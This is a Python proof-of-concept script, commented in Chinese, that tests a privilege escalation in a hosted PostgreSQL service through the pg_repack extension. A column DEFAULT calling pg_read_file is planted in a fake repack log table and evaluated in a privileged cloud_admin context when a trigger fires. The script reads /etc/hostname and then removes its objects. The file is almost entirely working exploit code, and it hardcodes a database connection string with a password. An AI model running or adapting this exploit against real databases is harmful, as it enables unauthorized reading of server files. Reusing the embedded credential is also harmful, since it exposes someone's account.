# -*- coding: utf-8 -*-
"""内置 superuser 函数在 cloud_admin SPI 上下文的可用性(补丁盲区测试)
载体:repack.log_<oid> 的 column DEFAULT 调 pg_read_file(内置,owner=superuser,不在补丁拦截范围)
零破坏:全自建对象,读 /etc/hostname(无害文件),结束全清理"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:300]

# 0) 基线:用户直调 superuser-only 内置函数
print('[0] direct pg_read_file:', q("SELECT pg_read_file('/etc/hostname')"))
print('[0] direct pg_ls_dir:', q("SELECT * FROM pg_ls_dir('/etc') LIMIT 3"))

# 1) 搭建
print('create ext:', q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False))
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("CREATE TABLE k_src(id int, v text)", fetch=False)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
print('oid:', oid)
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)

# 2) 载体 A:log 表 extra 列 DEFAULT = pg_read_file('/etc/hostname')
print('create log with DEFAULT pg_read_file:', q(
    "CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src, extra text DEFAULT pg_read_file('/etc/hostname'))" % (oid, oid), fetch=False))
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
print('create trigger:', q(
    "CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False))

# 3) 触发:cloud_admin SPI INSERT log_<oid> → DEFAULT 表达式在 cloud_admin 上下文求值
print('[A] trigger insert:', q("INSERT INTO k_src VALUES (1,'x')", fetch=False))

# 4) 观察结果
rows = q("SELECT pk, extra FROM repack.log_%d" % oid)
print('[A] log rows (pk, extra):', rows)

# 5) 清理
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
print('[cleanup]:', q("SELECT tablename FROM pg_tables WHERE schemaname IN ('public','repack')"))
print('ext:', q("SELECT extname FROM pg_extension WHERE extname='pg_repack'"))
conn.close()
